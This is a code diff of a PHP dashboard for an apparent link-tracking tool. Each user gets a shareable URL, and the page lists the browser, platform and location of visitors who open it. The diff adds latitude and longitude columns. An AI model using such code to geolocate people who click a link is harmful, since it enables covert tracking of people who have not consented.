@@ -28,7 +28,11 @@ $ret = getDataById($conn, $id);
 
     <div class="user-info">
         <div class="row">
-            Your URL : <span id="url-span"><?php print "www.tracker06.000webhostapp.com/q.php?q=" . $_SESSION["id"] ?></span>
+            Your URL : <span id="url-span"><?php print "$hostURL/q.php?q=" . $_SESSION["id"] ?></span>
+            <!-- Your URL : <span id="url-span"> -->
+            <?php //print "www.tracker06.000webhostapp.com/q.php?q=" . $_SESSION["id"] 
+            ?>
+            <!-- </span> -->
             <button id="copy">copy</button>
         </div>
         <div class="row">
@@ -51,10 +55,12 @@ $ret = getDataById($conn, $id);
                     <th>Browser</th>
                     <th>Version</th>
                     <th>Platform</th>
-                    <th>Device</th>
+                    <!-- <th>Device</th> -->
                     <th>City</th>
                     <th>State</th>
                     <th>Country</th>
+                    <th>Latitude</th>
+                    <th>Longitude</th>
                 </tr>
             </thead>
 
@@ -67,19 +73,18 @@ $ret = getDataById($conn, $id);
                         <td><?= $result["b_name"] ?></td>
                         <td><?= $result["b_version"] ?></td>
                         <td><?= $result["b_platform"] ?></td>
-                        <td><?= $result["device"] ?></td>
+                        <!-- <td>< ?= $result["device"] ?></td> -->
                         <td><?= $result["city"] ?></td>
                         <td><?= $result["state"] ?></td>
                         <td><?= $result["country"] ?></td>
+                        <td><?= $result["latitude"] ?></td>
+                        <td><?= $result["longitude"] ?></td>
                     </tr>
 
                 <?php } ?>
-
-
             </tbody>
         </table>
     </div>
-
 
     <script>
         function generateReport() {
@@ -92,7 +97,5 @@ $ret = getDataById($conn, $id);
             navigator.clipboard.writeText(text);
         });
     </script>
-
 </body>
-
 </html>
